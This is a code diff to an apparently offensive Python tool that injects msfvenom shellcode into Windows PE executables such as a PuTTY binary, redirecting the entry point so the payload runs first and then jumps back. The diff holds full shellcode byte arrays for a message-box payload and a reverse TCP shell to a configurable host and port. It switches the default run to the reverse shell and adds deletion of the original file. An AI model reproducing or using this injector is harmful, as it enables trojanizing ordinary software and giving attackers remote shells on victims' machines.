@@ -2,6 +2,16 @@ import pefile
 from config import VERBOSE
 import utilities
 import struct
+import os
+
+# TODO currently only works for 32 bit, 64 bit has a different packing
+# scheme and opcodes
+
+
+def call_oep(base, oep):
+    jumpback = base + oep
+    jumpback = struct.pack('I', jumpback)
+    return b'\xB8' + jumpback + b'\xFF\xD0'
 
 
 def msgbox(oep, base):
@@ -11,9 +21,8 @@ def msgbox(oep, base):
     # msfvenom -a x86 --platform windows -p windows/messagebox \
     # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
     # EXITFUNC=process TITLE="Testing" -f python
-    jumpback = base + oep  # \xF0\x50\x45\x00
-    jumpback = struct.pack('I', jumpback)
-    call = b'\xB8' + jumpback + b'\xFF\xD0'
+
+    call = call_oep(base, oep)
 
     messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                        b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
@@ -41,19 +50,17 @@ def msgbox(oep, base):
     return messagebox
 
 
-def reverse_shell(oep, base, lhost=None):
+def reverse_shell(oep, base, lhost=None, lport=8080):
     # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
     # LHOST=192.168.1.148 LPORT=8080 -f python
+
     if lhost is None:
         lhost = utilities.get_ip()
-
     ip = utilities.ip_to_hex(lhost)
 
-    jumpback = base + oep  # \xF0\x50\x45\x00
-    jumpback = struct.pack('I', jumpback)
-    call = b'\xB8' + jumpback + b'\xFF\xD0'
+    port = struct.pack('!H', lport)
+    call = call_oep(base, oep)
 
-    # jumpback = b'\xe8\x52\xed\xf5\xff\x90'
     shellcode = bytes(b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                       b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                       b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
@@ -69,7 +76,7 @@ def reverse_shell(oep, base, lhost=None):
                       b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
                       b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                       b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68" + ip + b"\x68"
-                      b"\x02\x00\x1f\x90\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
+                      b"\x02\x00" + port + b"\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
                       b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
                       b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
                       b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
@@ -98,8 +105,8 @@ def payload_selection(payload, oep, base, *args, **kwargs):
         return reverse_shell(oep, base, *args, **kwargs)
 
 
-def insert_payload(path, payload, *args, **kwargs):
-    path = utilities.make_duplicate(path, payload)
+def insert_payload(original_path, payload, *args, **kwargs):
+    path = utilities.make_duplicate(original_path, payload)
     pe = pefile.PE(path)
 
     # We will first change the binaries entry point to be the newly injected
@@ -123,8 +130,10 @@ def insert_payload(path, payload, *args, **kwargs):
     pe.write(path)
     print("[x] Payload injected\n")
 
+    utilities.delete_file(original_path)
+
 
 if __name__ == "__main__":
-    p = 'msg'
+    p = 'rev'
     path = "./assets/bin/putty_injection.exe"
-    insert_payload(path, p)
+    insert_payload(path, p, lport=8888)
